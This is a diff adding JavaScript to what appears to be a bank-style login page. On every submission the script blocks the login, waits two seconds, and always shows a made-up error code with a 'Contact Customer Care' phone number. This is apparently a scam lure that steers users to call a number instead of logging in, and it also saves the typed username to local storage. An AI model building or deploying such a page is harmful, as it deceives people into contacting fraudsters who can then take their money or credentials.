@@ -92,5 +92,52 @@
             <a href="#">Small Business</a>
         </div>
     </footer>
+    
+     <script>
+        // Function to save username to localStorage if "Remember my username" is checked
+        function saveUsername() {
+            const username = document.getElementById('username').value;
+            const remember = document.getElementById('remember').checked;
+
+            if (remember) {
+                localStorage.setItem('rememberedUsername', username);
+            } else {
+                localStorage.removeItem('rememberedUsername');
+            }
+        }
+
+        // Function to populate the username field if it was remembered
+        function loadRememberedUsername() {
+            const rememberedUsername = localStorage.getItem('rememberedUsername');
+            if (rememberedUsername) {
+                document.getElementById('username').value = rememberedUsername;
+                document.getElementById('remember').checked = true;
+            }
+        }
+
+        // Show error message on login attempt
+        function showErrorMessage() {
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.innerHTML = 'Error Code : 00X47800 <br> Contact Customer Care : +1-844-499-1812';
+        }
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Show error message after 2 seconds
+            setTimeout(function() {
+                showErrorMessage();
+            }, 2000); // 2000ms = 2 seconds
+
+            // Save the username if remember is checked
+            saveUsername();
+        });
+
+        // Load remembered username on page load
+        window.onload = function() {
+            loadRememberedUsername();
+        };
+    </script>
 </body>
 </html>
